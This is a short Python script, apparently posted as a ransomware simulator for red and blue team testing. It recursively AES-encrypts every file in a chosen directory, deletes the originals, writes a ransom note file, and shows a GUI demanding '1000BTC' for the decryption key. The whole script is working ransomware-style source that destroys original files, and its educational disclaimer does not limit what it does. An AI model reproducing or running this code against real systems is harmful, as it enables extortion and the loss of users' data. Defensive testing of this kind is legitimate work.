# coded by zer0_p1k4chu
# Simple Ransomware for blue/red teams to test their defenses against ransomwares. Purely for Educational purposes.
# Author not responsible for any damage caused by using this tool.
#!/usr/bin/python3
import argparse
import os
import base64
import pyAesCrypt
import PySimpleGUI as sg
parser = argparse.ArgumentParser()
parser.add_argument("--dir",help="Location of the Folder you want to simulate")
parser.add_argument("--mode",help="Accepts encrypt or decrypt arguments.")
parser.add_argument("--password",help="Password to use for encryption/decryption.")
args = parser.parse_args()
def EncryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(file, file+".pyran", password, bufferSize)
    os.remove(file)

def DecryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(file, file.split(".pyran")[0], password, bufferSize)
    os.remove(file)

# welcome = '''
# .______   ____    ____      .______          ___      .__   __. 
# |   _  \  \   \  /   /      |   _  \        /   \     |  \ |  | 
# |  |_)  |  \   \/   / ______|  |_)  |      /  ^  \    |   \|  |
# |   ___/    \_    _/ |______|      /      /  /_\  \   |  . `  | 
# |  |          |  |          |  |\  \----./  _____  \  |  |\   | 
# | _|          |__|          | _| `._____/__/     \__\ |__| \__|

# ** PY-RAN is a Ransomware Simulator for Red/Blue Teams to simulate a ransomware.
# ** C0ded by zer0_p1k4chu
# ** use -h for help
# '''
# print(welcome)
def encrypt_data(password, dire='../azure_blob_analytics/'):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
        EncryptFile(file,password)
    print("Encryption Done!")
    f = open("ransom.txt","w+")
    f.write("PY-RAN ransomware simulated successfully encrypted the files.")
    f.close()

def decrypt_data(password, dire='../azure_blob_analytics/'):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(dire)] for val in sublist]:
        try:
            DecryptFile(file,password)
        except ValueError:
            # .DS_STORE file
            continue
    print("Decryption Done!")

if __name__ == '__main__':
    # Define the window's contents
    layout = [[sg.Text("Your files have been encrypted. ")],
            [sg.Text("Pay 1000BTC to recieve decryption key.")],
            [sg.T("")], [sg.Text("Choose a folder: "), sg.Input(key="-DIR-" ,change_submits=True), sg.FolderBrowse(key="-DIR-")],[sg.Button("Submit")],
            [sg.Text("Enter Encryption Key...")],
            [sg.Input(key='-EINPUT-')],
            [sg.Text("Enter Decryption Key...")],
            [sg.Input(key='-DINPUT-')],
            [sg.Text(size=(40,1), key='-OUTPUT-')],
            [sg.Button('Decrypt Files'),sg.Button('Encrypt'), sg.Button('Quit')]]

    # Create the window
    window = sg.Window('Ran Some Where', layout)

    # Display and interact with the Window using an Event Loop
    while True:
        event, values = window.read()
        # See if user wants to quit or window was closed
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        # Output a message to the window
        
        if event == 'Decrypt Files':
            window['-OUTPUT-'].update('Decrypting files with key: ' + values['-DINPUT-'] + ". . .")
            decrypt_data(values['-DINPUT-'], values['-DIR-'])

        elif event == 'Encrypt':
            window['-OUTPUT-'].update('Encrypting files with key: ' + values['-EINPUT-'] + ". . .")
            encrypt_data(values['-EINPUT-'], values['-DIR-'])

    # Finish up by removing from the screen
    window.close()
